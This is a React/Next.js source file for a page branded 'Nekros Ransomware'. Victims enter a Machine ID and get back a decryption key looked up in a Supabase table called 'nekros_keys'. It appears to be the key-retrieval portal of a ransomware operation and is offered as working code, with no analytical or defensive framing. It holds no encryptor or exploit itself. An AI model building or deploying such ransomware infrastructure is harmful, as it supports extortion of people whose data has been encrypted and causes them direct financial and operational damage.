"use client";

import { useState } from 'react';
import { supabase } from '../lib/supabaseClient';

export default function Home() {
  const [machineId, setMachineId] = useState('');
  const [decryptionKey, setDecryptionKey] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleGetKey = async () => {
    if (!machineId) {
      setError('Please enter a Machine ID.');
      return;
    }
    setLoading(true);
    setError('');
    setDecryptionKey('');

    try {
      const { data, error } = await supabase
        .from('nekros_keys')
        .select('decrypt_key')
        .eq('software_key', machineId)
        .single();

      if (error) {
        throw error;
      }

      if (data) {
        setDecryptionKey(data.decrypt_key);
      } else {
        setError('No decryption key found for this Machine ID.');
      }
    } catch (err: any) {
      setError(`Error fetching key: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-24 bg-gray-900 text-white">
      <div className="w-full max-w-md p-8 space-y-6 bg-gray-800 rounded-lg shadow-lg">
        <h1 className="text-3xl font-bold text-center text-red-500">Nekros Ransomware</h1>
        <p className="text-center text-gray-400">
          Enter your Machine ID to retrieve your decryption key.
        </p>
        <div className="space-y-4">
          <div>
            <label htmlFor="machineId" className="block text-sm font-medium text-gray-300">
              Machine ID
            </label>
            <input
              id="machineId"
              name="machineId"
              type="text"
              required
              value={machineId}
              onChange={(e) => setMachineId(e.target.value)}
              className="w-full px-3 py-2 mt-1 text-gray-900 bg-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500"
              placeholder="Your unique machine ID"
            />
          </div>
          <button
            onClick={handleGetKey}
            disabled={loading}
            className="w-full px-4 py-2 font-semibold text-white bg-red-600 rounded-md hover:bg-red-700 disabled:bg-red-400 disabled:cursor-not-allowed"
          >
            {loading ? 'Searching...' : 'Get Decryption Key'}
          </button>
        </div>
        {decryptionKey && (
          <div className="p-4 mt-6 text-center bg-green-900 border border-green-700 rounded-lg">
            <h2 className="text-lg font-semibold text-green-300">Your Decryption Key:</h2>
            <p className="mt-2 font-mono text-lg text-green-200 break-all">{decryptionKey}</p>
          </div>
        )}
        {error && (
          <div className="p-4 mt-6 text-center bg-red-900 border border-red-700 rounded-lg">
            <h2 className="text-lg font-semibold text-red-300">Error:</h2>
            <p className="mt-2 text-red-200">{error}</p>
          </div>
        )}
      </div>
    </main>
  );
}
